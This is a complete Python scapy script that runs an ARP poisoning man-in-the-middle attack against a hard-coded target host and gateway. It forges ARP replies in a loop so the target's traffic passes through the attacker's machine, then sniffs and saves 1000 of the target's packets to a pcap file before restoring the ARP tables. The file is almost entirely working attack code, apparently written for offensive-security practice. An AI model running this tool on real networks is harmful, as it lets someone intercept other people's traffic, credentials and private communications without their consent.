from scapy.all import *
from scapy.layers.l2 import *
import os
import sys
import threading
import signal

interface = "en1"
target = "172.16.1.71"
gateway = "172.16.1.254"
packet_count = 1000

conf.iface = interface

conf.verb = 0


# put the network back to the state it was before ARP poisoning
def restoreNet(gateway, gateway_mac, target, target_mac):
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    print("[*] Target Restored.")
    os.kill(os.getpid(), signal.SIGINT)


# uses srp to emit arp request to the required ip so resolve mac address
def getMacAddr(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


# builds arp request for poisoning ip and gateway
def poison_target(gateway, gateway_mac, target, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway
    poison_target.pdst = target
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target
    poison_gateway.pdst = gateway
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    # repeatedly send arp requests to keep cache poisoned while attack takes place
    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restoreNet(gateway, gateway_mac, target, target_mac)
            break
    print("[*] ARP poison attack finished")
    return


print("[*] Setting up %s" % interface)

gateway_mac = getMacAddr(gateway)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (gateway, gateway_mac))

target_mac = getMacAddr(target)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (target, target_mac))

# start of actual arp poisoning
poison_thread = threading.Thread(target=poison_target, args=(gateway, gateway_mac, target, target_mac))

poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)

    bpf_filter = "ip host %s" % target
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # write out packet to be viewable in wireshark
    wrpcap("arper.pcap", packets)

    restoreNet(gateway, gateway_mac, target, target_mac)

except KeyboardInterrupt:
    restoreNet(gateway, gateway_mac, target, target_mac)
    sys.exit(0)
